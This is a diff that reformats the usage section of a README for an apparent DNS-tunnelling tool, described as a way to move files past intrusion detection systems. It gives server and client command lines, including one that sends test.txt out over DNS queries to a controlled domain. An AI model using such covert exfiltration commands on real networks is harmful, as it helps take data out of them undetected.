@@ -7,14 +7,21 @@ Some IDS/IPS (Intrusion Detection System or Intrusion Prevention Systems) are mo
 ## How to use
 If you know what you are about to do, you should understand that you need to have a control of DNS records and have publicly available server. At this point we will assume that you have that part already done (instructions at part: How to install and configure).
 So the usage is simple, on the **"server"** you just need to run (after installing [scapy](https://scapy.net/) for your python):
-*python server.py IPtoListenOn DomainName NetworkInterface
-python server.py 192.168.0.1 my.domain.com eth0*
+
+*python server.py IPtoListenOn DomainName NetworkInterface*
+
+*python server.py 192.168.0.1 my.domain.com eth0*
+
 
 Reasons for requirements to provide IP and Network Interface: your server might have multiple, but we do not want to analyse the traffic we do not care about.
 
+
 If you choose to use the python on the client, then you do not need any additional libraries, standard installation will handle everything and here is the whole beauty. Otherwise there are compiled binaries for Windows (x86), Linux (x86) and OS X (x64), the code which has been compiled is written in GoLang (no judgement here, I am still starting the Go, so trial and error here). Client is simple as well:
-*python client.py fileName domain timeToSleep retriesIfNoDNSresponse fileNumberIfMultipleSent
-python client.py test.txt my.domain.com 1 2 5*
+
+*python client.py fileName domain timeToSleep retriesIfNoDNSresponse fileNumberIfMultipleSent*
+
+*python client.py test.txt my.domain.com 1 2 5*
+
 * fileName - the file name of file you want to transfer
 * domain - the domain which you are using (configured)
 * timeToSleep - the delay in seconds for between DNS requests, default is 0, (1 in example) increasing the number will slow down the transfer
